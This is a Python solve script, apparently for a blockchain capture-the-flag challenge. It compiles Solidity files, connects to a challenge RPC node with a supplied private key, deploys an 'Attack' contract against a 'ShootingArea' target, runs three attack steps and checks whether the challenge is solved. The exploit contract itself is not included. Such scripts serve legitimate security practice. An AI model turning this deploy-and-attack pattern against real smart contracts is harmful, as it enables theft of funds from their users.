from solcx import compile_files, install_solc_pragma
from web3 import Web3
from pwn import log, remote
install_solc_pragma('pragma solidity ^0.8.18;')
log.setLevel('debug')


rpc = "http://178.128.42.97:31938/"
private_key = input().strip()
setupContract = input().strip()
log.info(f"{private_key = }")
log.info(f"{setupContract = }")
# compile sol
compiled_sol = compile_files(
    ['Setup.sol', 'ShootingArea.sol', 'Attack.sol'],
    output_values=['abi', 'bin'],
    solc_version="0.8.18"
)
SetupContract = compiled_sol['Setup.sol:Setup']
ShootingAreaContract = compiled_sol['ShootingArea.sol:ShootingArea']
AttackContract = compiled_sol['Attack.sol:Attack']

w3 = Web3(Web3.HTTPProvider(rpc))
account = w3.eth.account.from_key(private_key)
my_address = account.address
log.info(f"My address: {my_address}")
log.info(f"My balance: {w3.eth.get_balance(my_address)}")

# log.debug("All accounts in this current network: ")
# for _address in w3.eth.accounts:
#     log.info(f"Address: {_address}, balance: {w3.eth.get_balance(_address)}")


# remote contract
Setup = w3.eth.contract(address=setupContract, abi=SetupContract['abi'])
ShootingAreaAddress = Setup.functions.TARGET().call()
ShootingAreaContract = w3.eth.contract(
    address=ShootingAreaAddress, abi=ShootingAreaContract['abi'])


def attack_deploy(Contract, add):
    contract = w3.eth.contract(abi=Contract['abi'], bytecode=Contract['bin'])
    transaction = contract.constructor(add).buildTransaction(
        {
            "chainId": w3.eth.chain_id,
            "gasPrice": w3.eth.gas_price,
            "from": my_address,
            "nonce": w3.eth.get_transaction_count(my_address),
            "value": 10**6
        }
    )
    sign_transaction = w3.eth.account.sign_transaction(
        transaction, private_key=private_key)
    print("Deploying Contract!")
    # Send the transaction
    transaction_hash = w3.eth.send_raw_transaction(
        sign_transaction.rawTransaction
    )
    # Wait for the transaction to be mined, and get the transaction receipt
    print("Waiting for transaction to finish...")
    transaction_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)
    print(transaction_receipt)
    print(f"Done! Contract deployed to {transaction_receipt.contractAddress}")
    return str(transaction_receipt.contractAddress)


AttackAddress = attack_deploy(AttackContract, ShootingAreaAddress)
Attack = w3.eth.contract(address=AttackAddress, abi=AttackContract['abi'])

tx_hash = Attack.functions.step1().transact({
    "chainId": w3.eth.chainId,
    "gasPrice": w3.eth.gas_price,
    "from": my_address,
    "nonce": w3.eth.getTransactionCount(my_address)
})
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

log.info(str(tx_receipt))

tx_hash = Attack.functions.step2().transact({
    "chainId": w3.eth.chainId,
    "gasPrice": w3.eth.gas_price,
    "from": my_address,
    "nonce": w3.eth.getTransactionCount(my_address)
})
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

log.info(str(tx_receipt))

tx_hash = Attack.functions.step3().transact({
    "chainId": w3.eth.chainId,
    "gasPrice": w3.eth.gas_price,
    "from": my_address,
    "nonce": w3.eth.getTransactionCount(my_address)
})
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
log.info(str(tx_receipt))

log.info(str(Setup.functions.isSolved().call()))
